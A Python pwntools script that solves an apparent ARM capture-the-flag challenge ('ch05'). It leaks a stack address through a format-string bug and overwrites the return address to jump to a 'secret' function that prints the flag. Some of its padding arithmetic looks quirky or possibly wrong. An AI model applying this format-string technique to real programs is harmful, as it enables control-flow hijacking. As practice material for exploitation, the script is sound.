__author__ = '@tomereyz'

from pwn import *
from ArmExploit import ArmExploit
import argparse


def send(r, msg_name, msg_content):
    r.sendline('send')
    r.recvuntil('Enter message name:')
    r.sendline(msg_name)
    r.recvuntil('Enter message content:')
    r.sendline(msg_content)


def main(execution):
    challenge_name = 'ch05'
    log.info('Exploiting {challenge_name}!'.format(challenge_name=challenge_name))
    r = ArmExploit(challenge_name=challenge_name, execution=execution).r

    secret_func_addr = ELF(challenge_name).functions['secret'].address

    leak_offset = 56
    r.recvuntil('exit - close program')
    send(r, msg_name='angel',
         msg_content='%{leak_offset}$x'.format(leak_offset=leak_offset))
    r.recvuntil('content:\"')
    stack_return = int(r.recvuntil('\n').strip(), 16) - 4
    log.info("stack return: {stack_return}".format(stack_return=hex(stack_return)))
    r.recvuntil('exit - close program')

    r1 = (secret_func_addr & 0xffff) - 0x8
    r2 = ((secret_func_addr >> 16) - r1 - 1) & 0xffff - 8
    content_offset01 = 30
    content_offset02 = 31

    # Option A
    send(r, msg_name='angel',
         msg_content='{ret01}{ret02}%{padding01}x%{content_offset01}$hnn%{padding02}x%{content_offset02}$hnn'.format(
             ret01=pack(stack_return, word_size=32),
             ret02=pack(stack_return + 2, word_size=32),
             content_offset01=content_offset01,
             content_offset02=content_offset02,
             padding01=r1,
             padding02=r2))

    # Option B
    # send(r, msg_name='angel',
    #      msg_content='{ret01}{ret02}%{padding01}x%{content_offset01}$hnn'.format(
    #          ret01=pack(stack_return, word_size=32),
    #          ret02=pack(stack_return + 2, word_size=32),
    #          content_offset01=content_offset01,
    #          padding01=r1))

    r.recvuntil('zenysec')
    flag = 'zenysec' + r.recvuntil('\n')
    log.success('The flag is: {flag}'.format(flag=flag))
    r.close()


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Exploit ch05')
    parser.add_argument('-e', '--execution', help='execution type', required=True, dest='execution')
    main(**vars(parser.parse_args()))
